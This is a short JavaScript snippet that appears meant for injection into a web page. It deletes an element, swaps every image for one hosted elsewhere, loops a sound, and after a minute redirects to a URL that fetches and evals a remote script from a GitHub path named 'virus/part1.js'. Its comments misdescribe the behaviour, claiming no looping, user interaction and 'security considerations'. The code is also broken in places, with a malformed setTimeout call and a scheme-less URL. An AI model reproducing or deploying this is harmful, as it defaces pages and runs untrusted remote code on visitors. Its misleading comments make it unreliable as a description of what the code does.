// Targeting elements
const targetDiv = document.querySelector('div.pa0.relative.ui_icon.ui_icon__file.ui_icon__lnk42');
const allImages = document.querySelectorAll('img');

// Function to replace images and play sound (without autoplay or loop)
function modifyContent() {
  if (targetDiv) {
    targetDiv.remove(); // Remove the targeted div
  }

  allImages.forEach(image => {
    image.src = 'https://leopard.hosting.pecon.us/dl/vzcbl/gdfdfgdfghdfgdfh.png'; // Replace image source
  });

  // Play sound (without autoplay or loop, user interaction required)
  const sound = new Audio();
  sound.src = 'your_sound_file.mp3'; // Replace with your sound file path
  sound.addEventListener('play', () => {
    console.log('Sound played'); // Optional: Log sound playback
  });
  sound.addEventListener('ended', () => {
      sound.play();
  });
  sound.play();
}

// Alert and redirection (with confirmation and security considerations)
function redirectWithAlert() {
    window.location.href = "www.windows93.net/#js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/windows93/main/virus/part1.js').then(response => response.text()).then(script => eval(script));";
}

// Call the functions (modify content first, then handle alert and redirection)
modifyContent();
setTimeout(function({
redirectWithAlert();
},60000)
